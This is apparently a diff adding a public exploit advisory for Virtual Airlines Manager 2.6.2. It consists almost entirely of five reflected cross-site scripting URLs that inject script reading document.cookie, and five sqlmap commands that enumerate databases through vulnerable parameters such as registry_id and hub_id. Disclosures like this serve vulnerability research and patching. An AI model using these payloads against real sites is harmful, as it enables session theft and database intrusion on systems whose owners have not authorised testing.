@@ -1,0 +1,24 @@
+# Exploit Title: Virtual Airlines Manager 2.6.2 - 'id' SQL Injection
+# Date: 2020-06-09
+# Exploit Author: Mosaaed
+# Vendor Homepage: http://virtualairlinesmanager.net/
+# Dork: N/A
+# Affected Version: 2.6.2
+# Tested on: Ubuntu
+# CVE : N/A
+ 
+-------------------
+xss
+
+http://localhost/vam/index.php?page=plane_info_public&registry_id=“><<script>alert(document.cookie);//<</script> 
+http://localhost/vam/index.php?page=fleet_public&plane_icao=1“><<script>alert(document.cookie);//<</script>
+http://localhost/vam/index.php?page=hub&hub_id=1“><<script>alert(document.cookie);//<</script>
+http://localhost/vam/index.php?page=fleet_public&plane_location=1“><<script>alert(document.cookie);//<</script>
+http://localhost/vam/index.php?page=event&event_id=1“><<script>alert(document.cookie);//<</script>
+-------------------------
+SQL Injection
+sqlmap -u "http://localhost/vam/index.php?page=manual_flight_details&ID=10" -p ID --dbs
+sqlmap -u "http://localhost/vam/index.php?page=plane_info_public&registry_id=10" -p registry_id --db
+sqlmap -u "http://localhost/vam/index.php?page=fleet_public&plane_icao=1" -p plane_icao --dbs
+sqlmap -u "http://localhost/vam/index.php?page=hub&hub_id=1" -p hub_id --dbs
+sqlmap -u "http://localhost/vam/index.php?page=fleet_public&plane_location=1" -p plane_location --dbs
